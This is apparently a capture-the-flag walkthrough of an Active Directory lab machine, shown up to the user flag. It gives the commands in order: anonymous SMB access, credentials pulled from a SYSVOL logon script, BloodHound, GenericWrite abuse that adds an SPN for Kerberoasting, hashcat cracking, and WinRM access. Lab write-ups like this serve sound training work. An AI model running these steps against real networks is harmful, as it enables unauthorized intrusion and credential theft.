Phase 1: Enumeration
Nmap Scan
bash

nmap -sV -Pn 10.129.45.26

Key findings: Domain Controller DC1.delegate.vl, Windows Server 2022, ports: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389, 5985
SMB Enumeration (anonymous access)
bash

smbclient -L //10.129.45.26 -N

Shares discovered: ADMIN,C,C, IPC$, NETLOGON, SYSVOL
Explore SYSVOL
bash

smbclient //10.129.45.26/SYSVOL -N
cd delegate.vl
cd scripts
ls
get logon.bat

Found hardcoded credentials in logon script:
text

net use v: \\dc1\development
if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123

Credentials discovered: A.Briggs:P4ssw0rd1#123
Phase 2: BloodHound & ACL Analysis
Verify credentials
bash

crackmapexec smb 10.129.45.26 -u 'A.Briggs' -p 'P4ssw0rd1#123'

[+] delegate.vl\A.Briggs:P4ssw0rd1#123
Check shares with A.Briggs
bash

crackmapexec smb 10.129.45.26 -u 'A.Briggs' -p 'P4ssw0rd1#123' --shares

Permissions: READ on IPC$, NETLOGON, SYSVOL
BloodHound enumeration
bash

bloodhound-python -d delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123' -ns 10.129.45.26 -c all --zip

Extract and analyze BloodHound data
bash

unzip 20260811141006_bloodhound.zip
grep -i "A.Briggs" 20260811141006_users.json

Key finding: A.Briggs (S-1-5-21-...-1104) has GenericWrite on N.Thompson (S-1-5-21-...-1108)

N.Thompson attributes:

    Member of: delegation admins (S-1-5-21-...-1121)

    Member of: Remote Management Users (S-1-5-32-580)

    Has SeEnableDelegationPrivilege

    admincount: true

    pwdneverexpires: true

Phase 3: Exploiting GenericWrite
WinRM attempt (failed - A.Briggs not in Remote Management Users)
bash

evil-winrm -i 10.129.45.26 -u 'A.Briggs' -p 'P4ssw0rd1#123'

Result: WinRM::WinRMAuthorizationError
Add SPN to N.Thompson for Kerberoasting
bash

python3 << 'EOF'
from ldap3 import Server, Connection, ALL, MODIFY_ADD
server = Server('10.129.45.26', get_info=ALL)
conn = Connection(server, 'delegate\\A.Briggs', 'P4ssw0rd1#123', auto_bind=True)
conn.modify("CN=N.Thompson,CN=Users,DC=delegate,DC=vl", {'servicePrincipalName': [(MODIFY_ADD, ['test/spn'])]})
print("Done:", conn.result)
conn.unbind()
EOF

Request TGS ticket
bash

impacket-GetUserSPNs 'delegate.vl/A.Briggs:P4ssw0rd1#123' -request -dc-ip 10.129.45.26

Output:
text

ServicePrincipalName   Name        MemberOf
test/spn               N.Thompson  CN=delegation admins,CN=Users,DC=delegate,DC=vl
HTTP/test.delegate.vl  N.Thompson  CN=delegation admins,CN=Users,DC=delegate,DC=vl

Save hash and crack
bash

echo '$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$...' > nthompson.hash
hashcat -m 13100 nthompson.hash /usr/share/wordlists/rockyou.txt --force

Cracked password: KALEB_2341
WinRM access as N.Thompson
bash

evil-winrm -i 10.129.45.26 -u 'N.Thompson' -p 'KALEB_2341'

[+] Successfully connected!
Verify privileges
powershell

whoami /priv

Output:

    SeMachineAccountPrivilege (add up to 10 computers to domain)

    SeEnableDelegationPrivilege (modify TRUSTED_FOR_DELEGATION flag)

    SeChangeNotifyPrivilege

    SeIncreaseWorkingSetPrivilege

Verify group membership
powershell

whoami /groups

    DELEGATE\delegation admins

    BUILTIN\Remote Management Users

Get user flag
powershell

type C:\Users\N.Thompson\Desktop\user.txt
